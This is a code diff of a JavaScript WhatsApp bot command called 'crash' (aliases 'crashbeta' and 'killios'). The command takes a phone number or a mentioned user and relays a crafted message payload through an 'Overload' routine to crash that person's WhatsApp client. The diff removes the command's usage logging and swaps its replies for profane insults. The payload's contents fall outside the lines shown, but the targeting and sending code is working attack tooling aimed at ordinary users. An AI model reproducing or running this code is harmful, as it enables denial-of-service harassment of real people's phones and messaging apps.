@@ -1,23 +1,21 @@
-const { DateTime } = require('luxon');
-const fs = require('fs');
-const path = require('path');
 const crypto = require('crypto');
 
 module.exports = {
   name: 'crash',
   aliases: ['crashbeta', 'killios'],
-  description: 'Sends a payload to overload a WhatsApp client',
-  async execute(message, args, conn, proto, generateWAMessageFromContent) {
-    try {
-      // Get current time using luxon
-      const now = DateTime.local().toLocaleString(DateTime.DATETIME_FULL);
+  description: 'Sends a payload to crash a WhatsApp client',
+  run: async (context) => {
+    const { client, m, prefix, text, botname } = context;
 
-      // Check for target (e.g., mentioned JID or phone number)
-      let target = args[0] || message.quoted?.sender || message.mentionedJid?.[0];
+    try {
+      // Check for target (phone number, quoted user, or mentioned JID)
+      let target = text.split(' ')[0] || m.quoted?.sender || m.mentionedJid?.[0];
       if (!target) {
-        return message.reply('Please provide a target (e.g., phone number or mention a user)!');
+        return client.sendMessage(m.chat, {
+          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, dumbass, give me a target! Use ${prefix}crash <number> or mention someone, moron.\n\nPowered by *${botname}*`
+        }, { quoted: m });
       }
-      // Ensure target is in JID format (e.g., 123456789@s.whatsapp.net)
+      // Convert to JID format if needed (e.g., 123456789 → 123456789@s.whatsapp.net)
       if (!target.includes('@s.whatsapp.net')) {
         target = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
       }
@@ -66,10 +64,10 @@ module.exports = {
         };
 
         // Create message with payload
-        const msg = generateWAMessageFromContent(target, proto.Message.fromObject(payload), { userJid: target });
+        const msg = context.generateWAMessageFromContent(target, context.proto.Message.fromObject(payload), { userJid: target });
 
         // Send message
-        await conn.relayMessage(target, msg.message, {
+        await client.relayMessage(target, msg.message, {
           messageId: msg.key.id,
         });
         console.log(`[IMMEDIATE FC] Sent to ${target}`);
@@ -79,25 +77,24 @@ module.exports = {
       await Overload(target);
 
       // Tailored response based on command
-      const command = message.content.toLowerCase().split(' ')[0];
+      const command = m.text.toLowerCase().split(' ')[0];
       let response;
       if (command === '.crash') {
-        response = `💥 Crash payload sent to ${target} at ${now}!`;
+        response = `💥 Payload dropped on ${target}! Shit’s about to hit the fan, bitches!\n\nPowered by *${botname}*`;
       } else if (command === '.crashbeta') {
-        response = `🧪 Beta crash payload sent to ${target} at ${now}!`;
+        response = `🧪 Beta payload blasted to ${target}! Testing some next-level chaos!\n\nPowered by *${botname}*`;
       } else if (command === '.killios') {
-        response = `🍎 iOS kill payload sent to ${target} at ${now}! 💀`;
+        response = `🍎 iOS smoked at ${target}! Say goodbye to that apple, fucker!\n\nPowered by *${botname}*`;
       }
 
       // Send response
-      await message.reply(response);
+      await client.sendMessage(m.chat, { text: `◈━━━━━━━━━━━━━━━━◈\n│❒ ${response}` }, { quoted: m });
 
-      // Log command usage
-      const logMessage = `[${now}] ${message.sender} used ${command} on ${target}\n`;
-      fs.appendFileSync(path.join(__dirname, 'command.log'), logMessage);
     } catch (error) {
-      console.error(`Error in crash command: ${error}`);
-      await message.reply('⚠️ Error: Could not send crash payload!');
+      console.error('Error sending crash payload:', error);
+      await client.sendMessage(m.chat, {
+        text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, something fucked up the crash payload. Try again, you slacker.\n\nPowered by *${botname}*`
+      }, { quoted: m });
     }
   },
 };
